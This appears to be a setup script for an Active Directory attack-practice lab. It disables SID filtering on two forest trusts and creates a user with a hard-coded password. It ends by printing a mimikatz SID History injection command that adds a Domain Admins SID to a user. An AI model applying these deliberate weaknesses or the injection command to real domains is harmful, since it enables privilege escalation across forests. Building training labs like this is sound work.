# 10_Setup_Trusts_And_SIDHistory.ps1 -- DC-01 atackcorp.local
# Configura SID Filtering y vulnerabilidades cross-forest
Import-Module ActiveDirectory
Write-Host "[*] Configurando SID History y trusts..."

# Deshabilitar SID Filtering hacia corp.local
netdom trust atackcorp.local /domain:corp.local /quarantine:No /userO:Administrador /passwordO:NuevaPassword2026!
Write-Host "[!] SID Filtering deshabilitado -> corp.local"

# Deshabilitar SID Filtering hacia ext.local
netdom trust atackcorp.local /domain:ext.local /quarantine:No /userO:Administrador /passwordO:NuevaPassword2026!
Write-Host "[!] SID Filtering deshabilitado -> ext.local"

# Crear cross.user en atackcorp con acceso cross-forest
$pass = ConvertTo-SecureString "CrossUser2024!" -AsPlainText -Force
if (-not (Get-ADUser -Filter "SamAccountName -eq 'cross.user'" -ErrorAction SilentlyContinue)) {
    New-ADUser -Name "Cross User" -SamAccountName "cross.user" `
        -UserPrincipalName "cross.user@atackcorp.local" `
        -Path "OU=IT,DC=atackcorp,DC=local" `
        -AccountPassword $pass -Enabled $true
    Write-Host "[+] cross.user creado en atackcorp.local"
}

# Verificar trusts
Write-Host "[*] Trusts activos:"
Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType | Format-Table

Write-Host "[OK] Setup Trusts y SID History completado."
Write-Host "[i] Para SID History injection en Lab-06 usar:"
Write-Host "    mimikatz# misc::addsid /user:john.smith /sid:S-1-5-21-768292631-183641691-1245477636-512"
